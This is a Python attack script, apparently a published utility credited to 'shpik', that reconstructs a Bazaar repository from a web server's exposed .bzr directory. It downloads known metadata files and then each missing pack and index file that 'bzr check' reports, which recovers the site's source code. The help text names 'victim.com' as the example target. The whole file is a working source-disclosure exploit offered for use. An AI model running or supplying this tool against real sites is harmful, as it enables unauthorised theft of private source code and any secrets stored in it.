#!/usr/bin/python3
# Author : shpik (shpik.korea at gmail.com)

import requests
import sys
import subprocess
import os
import argparse

def checkValidation():
	p = subprocess.Popen(['bzr','check'],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	_,m = p.communicate()
	if b'ERROR' not in m:
		return True
	return m.split(b'.bzr/')[1].split(b'\'')[0].split(b'/')[-1].split(b'.')[0]

def getData(url):
	try:
		r = requests.get(url)
		return r.content
	except requests.exceptions.RequestException as e:
		print(e)
		exit(1)

def doDump(url):
	if url[-1] != '/':
		url += '/'
	prefix = '.bzr/'
	initials = [
		'repository/pack-names',
		'README',
		'checkout/dirstate',
		'checkout/views',
		'branch/branch.conf',
		'branch/format',
		'branch/last-revision',
		'branch/tag',
	]
	restore_path = [
		["repository/indices/",".cix"],
		["repository/indices/",".iix"],
		["repository/indices/",".rix"],
		["repository/indices/",".six"],
		["repository/indices/",".tix"],
		["repository/packs/",".pack"]
	]
	print("[!] Target : {}".format(url))
	print("[+] Start.")
	for initial in initials:
		print("[+] GET {}".format(initial))
		with open(prefix+initial,'wb') as f:
			r = getData(url+prefix+initial)
			f.write(r)
	
	while 1:
		fn = checkValidation()
		if fn == True:
			break
		print("[+] GET {}".format(fn))
		for res in restore_path:
			np = prefix+res[0]+fn.decode('utf-8')+res[1]
			restore_url = url+np
			with open(np,'wb') as f:
				r = getData(restore_url)
				f.write(r)

	print("[*] Finish")

if __name__=="__main__":
	parser = argparse.ArgumentParser(description='bazaar dump tools developed by shpik(shpik.korea at gmail.com)')
	parser.add_argument('-u',"--url",
                    help='url for dump.(e.g. http://victim.com/')
	parser.add_argument('-o',"--output", default="output",
                    help='output dir.')

	args = parser.parse_args()
	os.mkdir(args.output)
	os.chdir(args.output)
	os.system('bzr init')
	doDump(args.url)
	os.system('bzr revert')
